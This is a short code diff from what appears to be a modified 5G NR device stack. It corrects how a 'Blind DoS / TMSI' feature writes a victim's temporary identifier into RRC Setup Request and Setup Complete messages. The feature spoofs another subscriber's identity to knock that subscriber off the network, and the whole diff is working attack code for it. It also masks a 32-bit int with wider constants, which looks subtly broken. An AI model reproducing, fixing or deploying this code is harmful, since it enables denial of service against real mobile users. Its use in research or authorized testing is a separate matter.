@@ -844,15 +844,14 @@ uint8_t do_RRCSetupRequest(uint8_t Mod_id, uint8_t *buffer, size_t buffer_size, 
     int tmsi = tmsi_blind_dos_rrc << 1; // TMSI needs to be shifted because the TMSI buffer is 39 bits
     LOG_I(NR_RRC, "[Blind DoS / TMSI] RRC Setup Request, target TMSI: %d\n", tmsi);
     rrcSetupRequest->rrcSetupRequest.ue_Identity.present = NR_InitialUE_Identity_PR_ng_5G_S_TMSI_Part1;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.size = 6;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.size = 5;
     rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.bits_unused = 0;
     rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf = buf;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[0] = (tmsi & 0xff0000000000) >> 40;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[1] = (tmsi & 0x00ff00000000) >> 32;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[2] = (tmsi & 0x0000ff000000) >> 24;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[3] = (tmsi & 0x000000ff0000) >> 16;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[4] = (tmsi & 0x00000000ff00) >> 8;
-    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[5] = (tmsi & 0x0000000000ff) >> 0;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[0] = (tmsi & 0xff00000000) >> 32;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[1] = (tmsi & 0x00ff000000) >> 24;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[2] = (tmsi & 0x0000ff0000) >> 16;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[3] = (tmsi & 0x000000ff00) >> 8;
+    rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.buf[4] = (tmsi & 0x00000000ff) >> 0;
   }
   else if (1) {
     rrcSetupRequest->rrcSetupRequest.ue_Identity.present = NR_InitialUE_Identity_PR_randomValue;
@@ -994,7 +993,7 @@ uint8_t do_RRCSetupComplete(uint8_t Mod_id, uint8_t *buffer, size_t buffer_size,
   RrcSetupComplete->criticalExtensions.choice.rrcSetupComplete->ng_5G_S_TMSI_Value->choice.ng_5G_S_TMSI.size = 6;
   RrcSetupComplete->criticalExtensions.choice.rrcSetupComplete->ng_5G_S_TMSI_Value->choice.ng_5G_S_TMSI.buf = buf;
   if (tmsi_blind_dos_rrc /* != 0 */) {
-    int tmsi = tmsi_blind_dos_rrc << 1; // TMSI needs to be shifted because the TMSI buffer is 39 bits
+    int tmsi = tmsi_blind_dos_rrc;
     LOG_I(NR_RRC, "[Blind DoS / TMSI] RRC Setup Complete, target TMSI: %d\n", tmsi);
     RrcSetupComplete->criticalExtensions.choice.rrcSetupComplete->ng_5G_S_TMSI_Value->choice.ng_5G_S_TMSI.buf[0] = (tmsi & 0xff0000000000) >> 40;
     RrcSetupComplete->criticalExtensions.choice.rrcSetupComplete->ng_5G_S_TMSI_Value->choice.ng_5G_S_TMSI.buf[1] = (tmsi & 0x00ff00000000) >> 32;
